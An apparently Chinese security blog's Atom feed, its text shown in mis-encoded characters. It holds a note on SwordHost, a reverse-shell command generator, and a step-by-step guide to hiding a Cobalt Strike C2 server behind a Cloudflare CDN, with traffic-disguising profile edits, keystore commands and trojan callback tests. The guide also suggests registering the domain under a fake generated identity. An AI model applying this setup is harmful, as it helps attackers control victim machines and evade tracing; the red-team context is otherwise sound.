<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ä¸°æ¢“æ—çš„åšå®¢</title>
  <icon>https://fz1lin.com/icon.png</icon>
  <subtitle>æƒ³åšä¸€ä¸ªå‰‘å®¢ï¼Œä½†æ‰‹é‡Œæ²¡æœ‰åˆé€‚çš„å‰‘</subtitle>
  <link href="https://fz1lin.com/atom.xml" rel="self"/>
  
  <link href="https://fz1lin.com/"/>
  <updated>2023-02-08T05:32:22.818Z</updated>
  <id>https://fz1lin.com/</id>
  
  <author>
    <name>fz1lin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SwordHost å·¥å…·å¼€å‘</title>
    <link href="https://fz1lin.com/2023/3601054436/"/>
    <id>https://fz1lin.com/2023/3601054436/</id>
    <published>2023-02-08T05:26:27.000Z</published>
    <updated>2023-02-08T05:32:22.818Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SwordHost"><a href="#SwordHost" class="headerlink" title="SwordHost"></a>SwordHost</h1><p>SwordHost æ¸—é€æµ‹è¯•è¾…åŠ©å·¥å…·ç®±ï¼Œå‚è€ƒäº†ï¼Œå¤§é‡çš„å¼€æºé¡¹ç›®ï¼Œæœ‰ç½‘é¡µç‰ˆç”Ÿæˆpayloadçš„ï¼Œä½†æ˜¯ä¸æ»¡è¶³ç°åœ¨æ‰€éœ€ï¼Œå¦‚æœäºŒå¼€éœ€è¦æœåŠ¡å™¨ï¼Œå¾ˆéº»çƒ¦ï¼Œå¦‚æœæœ‰å¤šä¸ªæµ‹è¯•èŠ‚ç‚¹ï¼Œæ¯æ¬¡è¾“å…¥å¾ˆéº»çƒ¦ï¼Œè€Œä¸”Javaæœ‰äº›éœ€è¦ç¼–ç ï¼Œæ¯æ¬¡éƒ½éœ€è¦æ‰¾åœ¨çº¿ç½‘ç«™ï¼Œå¾ˆéº»çƒ¦ï¼Œå› æ­¤SwordHostè¯ç”Ÿäº†ï¼Œç”± Java 8 ç¼–å†™ï¼Œå‘ä¸Šå…¼å®¹ï¼Œé€‚ç”¨äºå¤šä¸ªå¹³å°ï¼ŒåŒå‡»å³å¯è¿è¡Œï¼Œé‡Œé¢é›†æˆäº†ï¼Œæ¸—é€æµ‹è¯•å¸¸ç”¨çš„å°å·¥å…·ã€‚</p><p>ç»è¿‡å‡ ä¸ªç‰ˆæœ¬çš„å†…éƒ¨è¿­ä»£ï¼Œæ–°ç‰ˆæœ¬å·²ç»å‘å¸ƒï¼Œå…·ä½“è¯·è®¿é—® <a href="https://github.com/fz1lin/SwordHost">GitHub</a></p><p>å¦‚æœå¸ˆå‚…ä»¬æœ‰å¥½çš„å»ºè®®ï¼Œå¯ä»¥å‘é‚®ç®±æˆ–è€…<a href="https://github.com/fz1lin/SwordHost/issues">issues</a>ï¼Œä¹Ÿå¯ä»¥PR</p><p>å…·ä½“ä½¿ç”¨è¯´æ˜ï¼Œè¯·è®¿é—®GitHubåœ°å€ï¼š<a href="https://github.com/fz1lin/SwordHost">https://github.com/fz1lin/SwordHost</a></p>]]></content>
    
    
    <summary type="html">æ¸—é€æµ‹è¯•è¾…åŠ©å·¥å…·ç®±ï¼Œåå¼¹shellï¼Œå‘½ä»¤ç”Ÿæˆå™¨ï¼Œè¾“å…¥å¯¹åº”IPç«¯å£å³å¯ï¼Œå®ç°ä¸€åŠ³æ°¸é€¸</summary>
    
    
    
    <category term="å·¥å…·å¼€å‘" scheme="https://fz1lin.com/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="Java" scheme="https://fz1lin.com/tags/Java/"/>
    
    <category term="tools" scheme="https://fz1lin.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>CS åŸŸå‰ç½®+æµé‡æ··æ·†</title>
    <link href="https://fz1lin.com/2022/937989325/"/>
    <id>https://fz1lin.com/2022/937989325/</id>
    <published>2022-11-20T03:50:01.000Z</published>
    <updated>2022-11-20T03:56:16.417Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01ç¯å¢ƒ"><a href="#0x01ç¯å¢ƒ" class="headerlink" title="0x01ç¯å¢ƒ"></a>0x01ç¯å¢ƒ</h2><p>c2 æœåŠ¡å™¨ï¼šcs 4.7</p><p>æœåŠ¡å™¨ç«¯ï¼šCentOS 7</p><p>å®¢æˆ·ç«¯ï¼šwin10</p><p>è¯­è¨€ï¼šJava 11</p><h2 id="0x02-æ¦‚è¿°"><a href="#0x02-æ¦‚è¿°" class="headerlink" title="0x02 æ¦‚è¿°"></a>0x02 æ¦‚è¿°</h2><p>ä¸Šçº¿åŸç†ä¸º å—å®³è€…ä¸»æœºè¿è¡Œæœ¨é©¬â€”â€“&gt;CDNâ€”-&gt;csæœåŠ¡å™¨æ”¶åˆ°ä¸Šçº¿</p><p>æ‰§è¡Œæ“ä½œåŸç†ä¸º csæœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤â€”â€“&gt;CDNæ¥æ”¶â€”â€“&gt;å—å®³è€…ä¸»æœºæ‰§è¡Œå‘½ä»¤</p><p>æ¶æ„ï¼š</p><p><a href="http://freenom.com/" title="freenom.com">freenom.com</a> + <a href="http://cloudflare.com/" title="cloudflare.com">cloudflare.com</a> + vps</p><p>freenom ä½œä¸ºå…è´¹çš„åŸŸåï¼Œcloudfareä½œä¸ºCDN</p><p>åŸŸå+CDN+VPS&#x20;</p><h2 id="0x03-æ³¨å†Œç”³è¯·ç›¸å…³"><a href="#0x03-æ³¨å†Œç”³è¯·ç›¸å…³" class="headerlink" title="0x03 æ³¨å†Œç”³è¯·ç›¸å…³"></a>0x03 æ³¨å†Œç”³è¯·ç›¸å…³</h2><h3 id="1-freenom"><a href="#1-freenom" class="headerlink" title="1.freenom"></a>1.freenom</h3><p>å…·ä½“æ³¨å†Œå¯ä»¥å‚è€ƒè¿™ä¸ª</p><p><a href="https://zhuanlan.zhihu.com/p/115535965" title="https://zhuanlan.zhihu.com/p/115535965">https://zhuanlan.zhihu.com/p/115535965</a></p><p>&#x20;<a href="https://www.freenom.com/" title="https://www.freenom.com/">https://www.freenom.com/</a></p><p>å…ˆåœ¨æœç´¢æ¡†è¾“å…¥ä»»æ„çš„åŸŸåï¼Œç„¶åæ£€æŸ¥å¯ç”¨æ€§</p><p><img src="/2022/937989325/image_rJEFG6jZ6A-16689164290512.png"></p><p>é€‰æ‹©è´­ä¹°å¤šé•¿æ—¶é—´ï¼Œç„¶åç‚¹å‡»ç»§ç»­</p><p><img src="/2022/937989325/image_puMVD6k9Hp-16689164290501.png"></p><p>ç„¶åé€‰æ‹©é‚®ç®±ï¼Œæœ€å¥½æ˜¯Googleé‚®ç®±ï¼Œä¸´æ—¶é‚®ç®±æ³¨å†Œä¸äº†</p><p><img src="/2022/937989325/image_m4YuhzdQYZ-16689164290513.png"></p><p>åé¢éœ€è¦å¡«å†™çœŸå®èº«ä»½ï¼Œä¸ç„¶æ³¨å†Œä¸ä¸Šï¼Œå¯ä»¥ä½¿ç”¨éšæœºèº«ä»½ç”Ÿæˆä¸€ä¸ª</p><p><a href="https://www.shenfendaquan.com/" title="https://www.shenfendaquan.com/">https://www.shenfendaquan.com/</a>ï¼Œç„¶åå¡«å†™å¯¹åº”çš„å°±è¡Œäº†</p><p>è‡³æ­¤ï¼Œæ³¨å†ŒåŠç”³è¯·å®Œæˆã€‚ä½ ä¼šå¾—åˆ°ä¸€ä¸ªåŸŸåã€‚</p><h3 id="2-CloudFlare"><a href="#2-CloudFlare" class="headerlink" title="2.CloudFlare"></a>2.CloudFlare</h3><p>è¿™ä¸ªæ˜¯CDN</p><p><a href="https://www.cloudflare.com/zh-cn/" title="https://www.cloudflare.com/">https://www.cloudflare.com/</a></p><p>ç›´æ¥ç”¨ä¸´æ—¶é‚®ç®±æ³¨å†Œä¸€ä¸ªå³å¯</p><p><a href="https://temp-mail.org/zh/" title="https://temp-mail.org/zh/">https://temp-mail.org/zh/</a></p><h2 id="0x04-ç»‘å®šæœåŠ¡å™¨"><a href="#0x04-ç»‘å®šæœåŠ¡å™¨" class="headerlink" title="0x04 ç»‘å®šæœåŠ¡å™¨"></a>0x04 ç»‘å®šæœåŠ¡å™¨</h2><p>å°†freenom è´­ä¹°çš„åŸŸåæ·»åŠ è¿›å»</p><p>å¯ä»¥å‚è€ƒè¿™ä¸ª</p><p><a href="https://blog.csdn.net/weixin_42891146/article/details/122209661" title="https://blog.csdn.net/weixin_42891146/article/details/122209661">https://blog.csdn.net/weixin_42891146/article/details/122209661</a></p><h3 id="1-æ·»åŠ ç«™ç‚¹"><a href="#1-æ·»åŠ ç«™ç‚¹" class="headerlink" title="1.æ·»åŠ ç«™ç‚¹"></a>1.æ·»åŠ ç«™ç‚¹</h3><p><img src="/2022/937989325/image_UVxPdhuqxz-16689164290514.png"></p><p>é€‰æ‹©å…è´¹çš„å³å¯</p><p><img src="/2022/937989325/image_OBFQK8nxwB-16689164290515.png"></p><p>å¤åˆ¶ nameserver1 å’Œ nameserver2çš„å†…å®¹</p><p><img src="/2022/937989325/image_pVFx8hfKus-16689164290516.png"></p><h3 id="2-CDNç»‘å®šåŸŸå"><a href="#2-CDNç»‘å®šåŸŸå" class="headerlink" title="2.CDNç»‘å®šåŸŸå"></a>2.CDNç»‘å®šåŸŸå</h3><p>é€‰æ‹©Servicesâ†’MyDomains</p><p><img src="/2022/937989325/image_tTI8V-rHk--16689164290517.png"></p><p>é€‰æ‹©Manage Domain</p><p><img src="/2022/937989325/image_yFhgVBAoVR-16689164290518.png"></p><p>é€‰æ‹©Nameservers</p><p><img src="/2022/937989325/image_KakkEqhHXF-16689164290519.png"></p><p>å°†CloudFlareä¸¤ä¸ªåœ°å€å¡«è¿›å»</p><p><img src="/2022/937989325/image_L6MgdGHo-6-166891642905110.png"></p><p>è¿”å›CloudFlare å»çœ‹ï¼Œè¿™ä¸ªéœ€è¦ç­‰ä¸€ä¼šï¼Œç­‰åˆ° active å³å¯</p><p><img src="/2022/937989325/image_BweIR-Yool-166891642905111.png"></p><h3 id="3-è®¾ç½®è§£æ"><a href="#3-è®¾ç½®è§£æ" class="headerlink" title="3.è®¾ç½®è§£æ"></a>3.è®¾ç½®è§£æ</h3><p>æ·»åŠ ä¸€ä¸ª Aè®°å½• <a href="http://www.xxx.tk/">www.xxx.tk</a>  content ä¸ºipåœ°å€</p><p>æœ€ç»ˆåŸŸåä¸º  <a href="http://www.xxx.tk/">www.xxx.tk</a></p><p><img src="/2022/937989325/image_TNhkoWiXG_-166891642905112.png"></p><p>é…ç½®è¿™ä¸ª</p><p><img src="/2022/937989325/image_HM52RQYZLY-166891642905113.png"></p><p>ä»¥æ­¤å¾€ä¸‹å…³é—­å³å¯</p><p><img src="/2022/937989325/image_g36-1-C_tX-166891642905214.png"></p><p><img src="/2022/937989325/image_eKhEpGv2jl-166891642905215.png"></p><p><img src="/2022/937989325/image_c6YR65KgUo-166891642905216.png"></p><h3 id="4-æµ‹è¯•"><a href="#4-æµ‹è¯•" class="headerlink" title="4.æµ‹è¯•"></a>4.æµ‹è¯•</h3><p>vps è®¿é—®å¼€å¯80ç«¯å£</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p><a href="http://www.xxx.tk/">http://www.xxx.tk</a> åŸŸåå¯ä»¥çœ‹åˆ°å†…å®¹</p><p>ç„¶åè®¿é—®åŸŸåçš„80ç«¯å£æµ‹è¯•</p><p><img src="/2022/937989325/image_B19lRxrjEX-166891642905217.png"></p><p>pingåŸŸåçœ‹çœ‹</p><p><img src="/2022/937989325/image_0lwg7wkQ8t-166891642905218.png"></p><p>è‡³æ­¤ç»‘å®šå·²ç»å®Œæˆ</p><h2 id="0x05-HTTPS-åŠ å¯†"><a href="#0x05-HTTPS-åŠ å¯†" class="headerlink" title="0x05 HTTPS åŠ å¯†"></a>0x05 HTTPS åŠ å¯†</h2><p>å‚è€ƒè¿™ä¸ª</p><p><a href="https://cn-sec.com/archives/1168150.html" title="https://cn-sec.com/archives/1168150.html">https://cn-sec.com/archives/1168150.html</a></p><p><a href="https://blog.csdn.net/weixin_42891146/article/details/122209661" title="https://blog.csdn.net/weixin_42891146/article/details/122209661">https://blog.csdn.net/weixin_42891146/article/details/122209661</a></p><p>ç”Ÿæˆwww.xxx.tk.store</p><p>åˆ›å»ºè¯ä¹¦</p><p><img src="/2022/937989325/image_Qwz9ppZjkl-166891642905219.png"></p><p><img src="/2022/937989325/image_awd5tWXjx5-166891642905220.png"></p><p>å¤åˆ¶è¯ä¹¦åˆ›å»ºtxtå¯¼å…¥ï¼Œä¿®æ”¹æ–‡ä»¶åä¸ºxxxx.pem</p><p>å¤åˆ¶ç§é’¥åˆ›å»ºtxtå¯¼å…¥ï¼Œä¿®æ”¹æ–‡ä»¶åä¸ºxxxx.key</p><p>å°†åˆ›å»ºçš„pemå’Œkeyæ–‡ä»¶ä¸Šä¼ è‡³äº‘æœåŠ¡å™¨ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ˆ<a href="http://www.xxx.comä¸ºç”³è¯·çš„åŸŸå)/">www.xxx.comä¸ºç”³è¯·çš„åŸŸåï¼‰</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in xxxx.pem -inkey xxxx.key -out www.xxx.com.p12 -name www.xxx.com -passout pass:<span class="number">123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass <span class="number">123456</span> -destkeypass <span class="number">123456</span> -destkeystore www.xxx.com.store -srckeystore www.xxx.com.p12 -srcstoretype PKCS12 -srcstorepass <span class="number">123456</span> -alias www.xxx.com</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x06-æµé‡æ··æ·†"><a href="#0x06-æµé‡æ··æ·†" class="headerlink" title="0x06 æµé‡æ··æ·†"></a>0x06 æµé‡æ··æ·†</h2><h3 id="1-é…ç½®profileæ–‡ä»¶"><a href="#1-é…ç½®profileæ–‡ä»¶" class="headerlink" title="1.é…ç½®profileæ–‡ä»¶"></a>1.é…ç½®profileæ–‡ä»¶</h3><p>GitHubæœ‰å¾ˆå¤šï¼Œå…·ä½“å¯ä»¥è‡ªå·±æ‰¾ï¼Œæœç´¢ profile å…³é”®å­—å³å¯</p><p><a href="https://github.com/threatexpress/malleable-c2" title="https://github.com/threatexpress/malleable-c2">https://github.com/threatexpress/malleable-c2</a></p><p>è¿™é‡Œæˆ‘ç”¨çš„æ˜¯è¿™ä¸ªï¼Œå› ä¸ºæˆ‘çš„csæ˜¯4.7çš„æ‰€ä»¥ç”¨4.7çš„ profile</p><p><img src="/2022/937989325/image_KMCqL-iR_F-166891642905221.png"></p><h4 id="https-certificate"><a href="#https-certificate" class="headerlink" title="https-certificate"></a>https-certificate</h4><p>æ‰“å¼€ä¸‹è½½å¥½çš„jquery-Profile</p><p>ä¸€ä¸ªæ˜¯https-certificateæ¨¡å—ä¸­çš„<code>keystore</code>å’Œ<code>password</code>ï¼Œä¿®æ”¹åæŠŠæ³¨é‡Šå»æ‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åŸæ–‡ä»¶</span></span><br><span class="line"># set keystore <span class="string">&quot;/pathtokeystore&quot;</span>;</span><br><span class="line"># set password <span class="string">&quot;password&quot;</span>;</span><br><span class="line">ä¿®æ”¹ä¸ºï¼Œè¦å¸¦ store</span><br><span class="line">set keystore <span class="string">&quot;www.xxx.tk.store&quot;</span></span><br><span class="line">set password <span class="string">&quot;123456&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/937989325/image_nNxx7rRVvy-166891642905222.png"></p><h4 id="http-stager"><a href="#http-stager" class="headerlink" title="http-stager"></a>http-stager</h4><p>ä¿®æ”¹http-stager ä¸­çš„Hostå’ŒRefereråŠContent-Typeã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server ä¸­ Content-Type</span></span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">ä¿®æ”¹ä¸ºï¼š</span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/*; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client Hostå’ŒReferer</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/937989325/image_MKSt_peDur-166891642905223.png"></p><h4 id="http-get"><a href="#http-get" class="headerlink" title="http-get"></a>http-get</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server ä¸­ Content-Type</span></span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">ä¿®æ”¹ä¸ºï¼š</span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/*; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client Hostå’ŒReferer</span></span><br></pre></td></tr></table></figure><p><img src="/2022/937989325/image_31kA0GjjRB-166891642905224.png"></p><h4 id="http-post"><a href="#http-post" class="headerlink" title="http-post"></a>http-post</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// server ä¸­ Content-Type</span></span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/javascript; charset=utf-8&quot;</span>;</span><br><span class="line">ä¿®æ”¹ä¸ºï¼š</span><br><span class="line">header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/*; charset=utf-8&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client Hostå’ŒReferer</span></span><br></pre></td></tr></table></figure><p><img src="/2022/937989325/image_IUjxrRvbKP-166891642905225.png"></p><p>åœ¨è¿™ä¸ªProfileä¸­ï¼Œæˆ‘ä»¬è¯·æ±‚çš„URIæ˜¯ä»¥.jsç»“å°¾çš„ï¼ŒCloudflareä½œä¸ºä¸€ä¸ªCDNè‚¯å®šè¦å»ç¼“å­˜å®ƒï¼Œä½†è¿™æ ·çš„è¯è¯·æ±‚å°±æ— æ³•åˆ°è¾¾æˆ‘ä»¬çš„CSæœåŠ¡å™¨ï¼Œè‡ªç„¶ä¹Ÿå°±æ— æ³•ä¸Šçº¿äº†ã€‚ä½¿ç”¨å¼€å‘æ¨¡å¼å¹¶æ¸…é™¤ç¼“å­˜ï¼ˆè¿™ä¸ªåªèƒ½ç¼“å­˜ä¸¤ä¸ªå°æ—¶ï¼‰ã€‚</p><p><img src="/2022/937989325/image_5_qH7dfeLV-166891642905226.png"></p><p>è®¾ç½®è§„åˆ™ï¼Œä¸è®©CloudFlare è¿›è¡Œç¼“å­˜</p><p><img src="/2022/937989325/image_O-guBwLDJN-166891642905227.png"></p><h3 id="2-æµ‹è¯•"><a href="#2-æµ‹è¯•" class="headerlink" title="2.æµ‹è¯•"></a>2.æµ‹è¯•</h3><p>å°†ä¿®æ”¹çš„jquery-c2.4.3.profile ä¸Šä¼ vpsä¸Šé¢</p><p>åœ¨ä¿®æ”¹å®Œæˆåï¼Œä½¿ç”¨CSè‡ªå¸¦çš„c2lintå¯¹profileè¯­æ³•è¿›è¡Œæ£€æŸ¥ï¼Œæ²¡æœ‰æŠ¥é”™çš„è¯è¯´æ˜é…ç½®æ˜¯å¯¹çš„ã€‚</p><p>4.7 ä¸å¸¦è¿™ä¸ª c2lint ç›´æ¥è¿è¡Œå¦‚ä¸‹ï¼Œå¦‚æœæ²¡æœ‰é”™è¯¯è¯´æ˜æ­£ç¡®ï¼Œå¦‚æœæœ‰é”™è¯¯ä¼šæç¤ºprofileå“ªä¸€è¡Œå‡ºç°é—®é¢˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> password jquery-c2<span class="number">.4</span><span class="number">.3</span>.profile</span><br></pre></td></tr></table></figure><h2 id="0x07-æµ‹è¯•ä¸Šçº¿"><a href="#0x07-æµ‹è¯•ä¸Šçº¿" class="headerlink" title="0x07 æµ‹è¯•ä¸Šçº¿"></a>0x07 æµ‹è¯•ä¸Šçº¿</h2><h3 id="1-å¯åŠ¨csæœåŠ¡å™¨"><a href="#1-å¯åŠ¨csæœåŠ¡å™¨" class="headerlink" title="1.å¯åŠ¨csæœåŠ¡å™¨"></a>1.å¯åŠ¨csæœåŠ¡å™¨</h3><p><img src="/2022/937989325/image_ABtfm5v0Or-166891642905228.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> password jquery-c2<span class="number">.4</span><span class="number">.3</span>.profile</span><br></pre></td></tr></table></figure><h3 id="2-æ–°å»ºç›‘å¬å™¨"><a href="#2-æ–°å»ºç›‘å¬å™¨" class="headerlink" title="2.æ–°å»ºç›‘å¬å™¨"></a>2.æ–°å»ºç›‘å¬å™¨</h3><p>!!! æ³¨æ„ï¼š</p><p>å¦‚æœCSçš„æœåŠ¡å™¨æ˜¯å›½å†…æœåŠ¡å™¨ä¸”æ²¡æœ‰è¿›è¡Œå¤‡æ¡ˆçš„è¯ï¼Œæ˜¯æ— æ³•ä½¿ç”¨80ã€8080ã€443ã€8443ç«¯å£æä¾›æœåŠ¡çš„ï¼›å¦‚æœæœåŠ¡å™¨æ˜¯å›½å¤–æœåŠ¡å™¨çš„è¯åˆ™æ— å½±å“ã€‚Cloudflareçš„ä»£ç†æ¨¡å¼åªæœ‰éƒ¨åˆ†ç«¯å£èƒ½å¤Ÿä½¿ç”¨ï¼Œä½¿ç”¨æ—¶è¦æ³¨æ„ç«¯å£çš„è®¾ç½®ï¼Œå¦åˆ™æ˜¯ç›‘å¬ä¸åˆ°çš„ã€‚</p><p>Cloudflare æ”¯æŒçš„ HTTP ç«¯å£ï¼š80ã€8080ã€8880ã€2052ã€2082ã€2086ã€2095</p><p>Cloudflare æ”¯æŒçš„ HTTPS ç«¯å£ï¼š443ã€2053ã€2083ã€2087ã€2096ã€8443</p><p><img src="/2022/937989325/image__32jA1hix3-166891642905229.png"></p><h3 id="3-æŠ“åŒ…æµ‹è¯•"><a href="#3-æŠ“åŒ…æµ‹è¯•" class="headerlink" title="3.æŠ“åŒ…æµ‹è¯•"></a>3.æŠ“åŒ…æµ‹è¯•</h3><p>ç”Ÿæˆexeæœ¨é©¬ï¼ŒæŠ“åŒ…æµ‹è¯•</p><p>æ˜¯CDN åœ°å€</p><h4 id="httpæµé‡"><a href="#httpæµé‡" class="headerlink" title="httpæµé‡"></a>httpæµé‡</h4><p><img src="/2022/937989325/image_yvrIZnrAr2-166891642905330.png"></p><p><img src="/2022/937989325/image_vLy2U_dV5_-166891642905331.png"></p><h4 id="https-æµé‡"><a href="#https-æµé‡" class="headerlink" title="https æµé‡"></a>https æµé‡</h4><p><img src="/2022/937989325/image_3sZB7Ts5HV-166891642905332.png"></p><p><img src="/2022/937989325/image_Q57TIUwyUj-166891642905333.png"></p><p><img src="/2022/937989325/image_BZVnsaXzn5-166891642905334.png"></p><h4 id="powershel"><a href="#powershel" class="headerlink" title="powershel"></a>powershel</h4><p>å¦‚æœä¸ä¸Šçº¿æ£€æŸ¥ä¸€ä¸‹windowçš„å®æ—¶é˜²æŠ¤</p><p><img src="/2022/937989325/image_OMAH06ggbP-166891642905335.png"></p><p><img src="/2022/937989325/image_5q1ozVF71W-166891642905336.png"></p><p><img src="/2022/937989325/image_brimetYTCl-166891642905337.png"></p><p>æŸ¥çœ‹ç«¯å£å»ºç«‹æƒ…å†µï¼Œå¯ä»¥æŸ¥çœ‹ï¼Œæˆ‘ä»¬ç›‘å¬çš„httpçš„ç«¯å£æ˜¯8880ï¼Œè¿™ä¸ªåœ°å€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ant </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/937989325/image_Gzm1dDeLDv-166891642905338.png"></p><p><img src="/2022/937989325/image_VURPb6YgVY-166891642905339.png"></p><h2 id="0x08-ä¿®æ”¹ç«¯å£"><a href="#0x08-ä¿®æ”¹ç«¯å£" class="headerlink" title="0x08 ä¿®æ”¹ç«¯å£"></a>0x08 ä¿®æ”¹ç«¯å£</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./TeamServerImage -Dcobaltstrike.server_port=<span class="number">48951</span> -Dcobaltstrike.server_bindto=<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=<span class="number">123456</span> teamserver $*</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/937989325/image_u3V-TVGnM7-166891642905340.png"></p><p>å¯ä½œä¸ºå‚è€ƒçš„é“¾æ¥</p><p><a href="https://cloud.tencent.com/developer/article/1952637" title="https://cloud.tencent.com/developer/article/1952637">https://cloud.tencent.com/developer/article/1952637</a></p><p><a href="https://www.wangan.com/p/7fy7475c1903ed27" title="https://www.wangan.com/p/7fy7475c1903ed27">https://www.wangan.com/p/7fy7475c1903ed27</a></p><p><a href="https://www.exterminate-dog.com/2022/01/17/2022004/" title="https://www.exterminate-dog.com/2022/01/17/2022004/">https://www.exterminate-dog.com/2022/01/17/2022004/</a></p><p><a href="https://cn-sec.com/archives/1168150.html" title="https://cn-sec.com/archives/1168150.html">https://cn-sec.com/archives/1168150.html</a></p><p><a href="https://xz.aliyun.com/t/5728" title="https://xz.aliyun.com/t/5728">https://xz.aliyun.com/t/5728</a></p><p><a href="https://blog.csdn.net/weixin_42891146/article/details/122209661" title="https://blog.csdn.net/weixin_42891146/article/details/122209661">https://blog.csdn.net/weixin_42891146/article/details/122209661</a></p><p><a href="https://toutiao.io/posts/d3yizxm/preview" title="https://toutiao.io/posts/d3yizxm/preview">https://toutiao.io/posts/d3yizxm/preview</a></p>]]></content>
    
    
    <summary type="html">csåŸŸå‰ç½®ï¼Œç”¨äºçº¢é˜Ÿéšè—ï¼ŒçœŸå®æœåŠ¡å™¨IPï¼Œé˜²æ­¢è¢«æº¯æº</summary>
    
    
    
    <category term="çº¢é˜Ÿå»ºè®¾" scheme="https://fz1lin.com/categories/%E7%BA%A2%E9%98%9F%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="vps" scheme="https://fz1lin.com/tags/vps/"/>
    
    <category term="cs" scheme="https://fz1lin.com/tags/cs/"/>
    
  </entry>
  
  <entry>
    <title>rad+xrayåœ¨Linuxè¿è¡Œçš„è¸©å‘è®°å½•</title>
    <link href="https://fz1lin.com/2022/794027888/"/>
    <id>https://fz1lin.com/2022/794027888/</id>
    <published>2022-02-24T12:44:31.000Z</published>
    <updated>2022-08-26T10:03:07.905Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-å®‰è£…-xray-å’Œ-rad"><a href="#0x01-å®‰è£…-xray-å’Œ-rad" class="headerlink" title="0x01 å®‰è£… xray å’Œ rad"></a>0x01 å®‰è£… xray å’Œ rad</h2><p>ç‰ˆæœ¬ 1.0 åŸºç¡€åŠŸèƒ½ 2022.2.24</p><p>ç‰ˆæœ¬ 2.0 å¢åŠ  screen 2022.8.13</p><p>è¿è¡Œç¯å¢ƒ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">centos</span> <span class="number">7</span></span><br></pre></td></tr></table></figure><p>xray <a href="https://github.com/chaitin/xray">https://github.com/chaitin/xray</a></p><p>rad <a href="https://github.com/chaitin/rad">https://github.com/chaitin/rad</a></p><p>å®‰è£…å°±ä¸ç”¨å¤šè¯´äº†ï¼Œå®‰è£…Linuxç‰ˆçš„å°±è¡Œäº†</p><h2 id="0x02-è¿è¡Œè„šæœ¬"><a href="#0x02-è¿è¡Œè„šæœ¬" class="headerlink" title="0x02 è¿è¡Œè„šæœ¬"></a>0x02 è¿è¡Œè„šæœ¬</h2><p>è„šæœ¬ä»‹ç»ï¼šrad+xray èåˆï¼Œæ¢æµ‹æ‰¹é‡ç›®æ ‡</p><p>è¿™ä¸ªè„šæœ¬æ˜¯åœ¨ windowä¸‹è¿è¡Œçš„ï¼Œæ‰€ä»¥ä½ è¦æŠŠxray.exeè¯¥æˆä½ Linuxç‰ˆxrayçš„åå­—</p><p>æ ¹æ®ä½ è‡ªå·±éœ€è¦é€‰æ‹©å³å¯</p><p><a 